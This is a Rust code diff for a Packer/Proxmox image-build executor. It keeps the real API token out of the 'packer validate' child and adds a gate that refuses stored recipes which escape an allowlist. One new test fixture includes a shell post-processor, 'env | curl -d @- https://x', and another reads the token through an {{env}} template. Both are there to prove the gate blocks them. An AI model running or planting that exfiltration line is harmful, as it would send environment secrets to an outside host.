@@ -87,6 +87,16 @@ pub struct ImagesExecutor {
     certificates: Option<Arc<dyn fleet_provider_proxmox::PveTransport>>,
 }
 
+/// The Proxmox plugin environments for a build: the `validate` child's
+/// (placeholder credentials) and the `build` child's (the real token).
+/// Both carry the same pinned TLS roots. Keeping the real token out of
+/// `validate` means the account's secret reaches only the child that
+/// actually contacts PVE (#313).
+struct BuildEnvs {
+    validate: SecretEnv,
+    build: SecretEnv,
+}
+
 /// The work-directory entries that carry the pinned trust to Packer.
 const TLS_DIR: &str = "tls";
 /// The pinned leaf, PEM-encoded: `SSL_CERT_FILE`.
@@ -143,21 +153,26 @@ impl ImagesExecutor {
         }
     }
 
-    /// The Proxmox plugin's environment for the build's account: its
-    /// token and, unless the version opted into skipping verification, its
-    /// pinned certificate as the only TLS root. A token is never handed out
-    /// for an account whose host trust is unconfirmed, or whose host now
-    /// presents a certificate other than the confirmed one.
+    /// The Proxmox plugin's environments for the build's account. Both carry
+    /// the pinned certificate as the only TLS root (unless the version opted
+    /// into skipping verification); the `build` child also carries the
+    /// account's real token, while the `validate` child carries only
+    /// placeholder credentials (#313). A token is never handed out for an
+    /// account whose host trust is unconfirmed, or whose host now presents a
+    /// certificate other than the confirmed one.
     async fn account_env(
         &self,
         account_id: Option<&str>,
         work_dir: &std::path::Path,
         insecure_tls: bool,
-    ) -> Result<SecretEnv, &'static str> {
+    ) -> Result<BuildEnvs, &'static str> {
         let (Some(accounts), Some(credentials), Some(certificates)) =
             (&self.accounts, &self.credentials, &self.certificates)
         else {
-            return Ok(SecretEnv::default());
+            return Ok(BuildEnvs {
+                validate: SecretEnv::default(),
+                build: SecretEnv::default(),
+            });
         };
         let account_id = account_id.ok_or("target_account_missing")?;
         let account = accounts
@@ -184,7 +199,10 @@ impl ImagesExecutor {
         if fleet_provider_proxmox::normalize_fingerprint(pinned) != digest {
             return Err("target_certificate_changed");
         }
-        let mut vars = Vec::new();
+        // The pinned TLS roots are plain file paths, not secrets, and both
+        // children get the same ones. Hold them as strings so each env's
+        // `SensitiveString`s can be built fresh (they do not clone).
+        let mut cert_vars: Vec<(&str, String)> = Vec::new();
         if !insecure_tls {
             // Go uses the platform verifier, not `SSL_CERT_FILE`, on these.
             if cfg!(any(target_os = "macos", target_os = "ios", windows)) {
@@ -195,29 +213,48 @@ impl ImagesExecutor {
             }
             let (file, dir) = write_pinned_roots(work_dir, &observed.der)
                 .map_err(|_| "certificate_write_failed")?;
-            for (name, path) in [("SSL_CERT_FILE", file), ("SSL_CERT_DIR", dir)] {
-                vars.push((
-                    name.to_owned(),
-                    fleet_core::SensitiveString::new(path.display().to_string()),
-                ));
-            }
+            cert_vars.push(("SSL_CERT_FILE", file.display().to_string()));
+            cert_vars.push(("SSL_CERT_DIR", dir.display().to_string()));
         }
         let secret = credentials
             .load(account_id)
             .await
             .map_err(|_| "account_credential_unreadable")?
             .ok_or("account_credential_missing")?;
-        vars.extend([
-            (
+        let env_with = |username: String, token: String| {
+            let mut vars: Vec<(String, fleet_core::SensitiveString)> = cert_vars
+                .iter()
+                .map(|(name, path)| {
+                    (
+                        (*name).to_owned(),
+                        fleet_core::SensitiveString::new(path.clone()),
+                    )
+                })
+                .collect();
+            vars.push((
                 "PROXMOX_USERNAME".to_owned(),
-                fleet_core::SensitiveString::new(account.token_id),
-            ),
-            (
+                fleet_core::SensitiveString::new(username),
+            ));
+            vars.push((
                 "PROXMOX_TOKEN".to_owned(),
-                fleet_core::SensitiveString::new(secret),
+                fleet_core::SensitiveString::new(token),
+            ));
+            SecretEnv::new(vars)
+        };
+        // `packer validate` runs the Proxmox plugin's `Prepare`, which needs
+        // a non-empty username and token or it errors, but never opens a
+        // connection — it returns before `Builder.Run`. So the real token is
+        // only needed by the build child. The validate child gets the same
+        // pinned TLS roots but placeholder credentials, so the account's
+        // secret rides only the one child that actually contacts PVE (#313).
+        // The placeholder is an obvious non-secret, never a real token.
+        Ok(BuildEnvs {
+            validate: env_with(
+                "fleet@pve!validate".to_owned(),
+                "00000000-0000-0000-0000-000000000000".to_owned(),
             ),
-        ]);
-        Ok(SecretEnv::new(vars))
+            build: env_with(account.token_id, secret),
+        })
     }
 
     /// Writes the secret var file, resolving the references just in time.
@@ -424,6 +461,17 @@ impl ImagesExecutor {
         if has_external_assets(&version.content) {
             return Err("asset_snapshot_missing");
         }
+        // Fail-closed recipe structure (#313): refuse a version whose recipe
+        // escapes the provisioner allowlist (`post-processors`,
+        // `error-cleanup-provisioner`, or any unknown top-level key) or reads
+        // the controller environment, files, or a secret store through a
+        // template function (`{{env}}`, `{{vault}}`, ...). Publishing already
+        // refuses these, but a version stored before this gate gets the same
+        // stable reason here, before the token or any recipe variable is
+        // resolved.
+        if let Some(reason) = fleet_core::recipe_build_refusal(&version.content) {
+            return Err(reason);
+        }
         // Skipping TLS verification sends the token to whatever answers at
         // the recipe's address: only a version published with the audited
         // opt-in may (#284).
@@ -488,7 +536,7 @@ impl ImagesExecutor {
         let work_dir = recipe_path.parent().ok_or("recipe_write_failed")?;
         // The certificate check comes first: a build refused for trust
         // resolves no secret at all, neither the token nor recipe variables.
-        let env = self
+        let envs = self
             .account_env(record.account_id.as_deref(), work_dir, insecure_tls)
             .await?;
         let var_file = self
@@ -523,7 +571,7 @@ impl ImagesExecutor {
                 &PackerCommand {
                     args: args(&["validate"]),
                     work_dir: work_dir.to_path_buf(),
-                    env: env.clone(),
+                    env: envs.validate,
                 },
                 VALIDATE_DEADLINE,
                 stop.clone(),
@@ -550,7 +598,7 @@ impl ImagesExecutor {
                 &PackerCommand {
                     args: args(&["-machine-readable", "build"]),
                     work_dir: work_dir.to_path_buf(),
-                    env,
+                    env: envs.build,
                 },
                 Duration::from_secs(payload.timeout_seconds.min(MAX_BUILD_TIMEOUT)),
                 stop,
@@ -1590,19 +1638,26 @@ mod tests {
     async fn a_build_gets_its_trusted_accounts_token_in_the_child_environment_only() {
         let (record, seen, stored) = credential_build(true, Some("fixture-account-token")).await;
         assert_eq!(record.outcome, "succeeded", "{:?}", record.reason);
-        // validate and build carry the token; the version probes carry
-        // none, not even the controller's own.
+        // Only the build child carries the real token. `packer validate`
+        // carries a placeholder (its Prepare never connects), and the
+        // version probes carry none, not even the controller's own (#313).
         for (args, token, isolated) in &seen {
             assert!(isolated, "{args}");
-            let wants = args.starts_with("validate") || args.contains(" build ");
-            assert_eq!(
-                token.as_deref(),
-                wants.then_some("fixture-account-token"),
-                "{args}"
-            );
+            if args.contains(" build ") {
+                assert_eq!(token.as_deref(), Some("fixture-account-token"), "{args}");
+            } else if args.starts_with("validate") {
+                assert_eq!(
+                    token.as_deref(),
+                    Some("00000000-0000-0000-0000-000000000000"),
+                    "{args}"
+                );
+            } else {
+                assert_eq!(token.as_deref(), None, "{args}");
+            }
             assert!(!args.contains("fixture-account-token"));
         }
         assert!(seen.iter().any(|(args, _, _)| args.contains(" build ")));
+        assert!(seen.iter().any(|(args, _, _)| args.starts_with("validate")));
         let record_text = serde_json::to_string(&record).unwrap();
         assert!(!record_text.contains("fixture-account-token"));
         assert!(!stored.contains("fixture-account-token"));
@@ -1859,6 +1914,77 @@ mod tests {
             assert_eq!(record.outcome, "failed");
             assert_eq!(record.reason.as_deref(), Some(reason));
             assert!(record.ended_at.is_some());
+        }
+    }
+
+    #[tokio::test]
+    async fn a_stored_recipe_that_escapes_the_allowlist_is_refused_before_any_secret() {
+        // A version published before the #313 gate existed carries recipe
+        // content that reads the controller environment or escapes the
+        // provisioner allowlist. The build is refused with a stable reason,
+        // before the token or any recipe variable is resolved: the transport
+        // never runs `validate` or `build`, so no credential is handed out.
+        // Build the malicious variants by editing the parsed JSON, so the
+        // forbidden structure lands exactly where intended (a top-level
+        // `post-processors`, not a stray provisioner field).
+        let mut env_doc: serde_json::Value = serde_json::from_str(CONTENT).unwrap();
+        env_doc["variables"] = serde_json::json!({ "t": "{{env `PROXMOX_TOKEN`}}" });
+        let env_var = env_doc.to_string();
+        let mut post_doc: serde_json::Value = serde_json::from_str(CONTENT).unwrap();
+        post_doc["post-processors"] =
+            serde_json::json!([{"type":"shell-local","inline":["env | curl -d @- https://x"]}]);
+        let post = post_doc.to_string();
+        for (malicious, reason) in [
+            (env_var.as_str(), "recipe_forbidden_template_function"),
+            (post.as_str(), "recipe_forbidden_top_level_key"),
+        ] {
+            // Publish a benign version (the gate forbids publishing the
+            // malicious one), then rewrite its stored content to simulate a
+            // pre-gate version.
+            let (dir, store, repository, operations, operation, transport) =
+                setup(CONTENT, serde_json::json!({}), probes(), false).await;
+            sqlx::query("UPDATE image_recipe_versions SET content = ?1")
+                .bind(malicious)
+                .execute(store.pool())
+                .await
+                .unwrap();
+            let der = leaf(&["pve.example.test"]);
+            let executor = ImagesExecutor::new(
+                repository.clone(),
+                transport.clone(),
+                None,
+                dir.path().join("work"),
+            )
+            .with_account_credentials(
+                Arc::new(fleet_storage_sqlite::ProxmoxAccountRepository::new(
+                    store.pool().clone(),
+                )),
+                Arc::new(OneToken(Some("fixture-secret-token"))),
+                Arc::new(Presents(Some(der.clone()))),
+            );
+            sqlx::query("UPDATE proxmox_accounts SET fingerprint = ?1 WHERE id = 'account-1'")
+                .bind(pin_of(&der))
+                .execute(store.pool())
+                .await
+                .unwrap();
+            assert!(
+                operations
+                    .execute_claimed(&executor, operation.clone())
+                    .await
+            );
+            let record = repository.get_build(&operation.id).await.unwrap();
+            assert_eq!(record.outcome, "failed", "{malicious}");
+            assert_eq!(record.reason.as_deref(), Some(reason), "{malicious}");
+            let seen = transport.saw_env.lock().unwrap().clone();
+            assert!(
+                seen.iter()
+                    .all(|(args, _, _)| !args.starts_with("validate") && !args.contains(" build ")),
+                "no validate/build ran: {seen:?}"
+            );
+            assert!(
+                seen.iter().all(|(_, token, _)| token.is_none()),
+                "no token was handed to any child: {seen:?}"
+            );
         }
     }
 
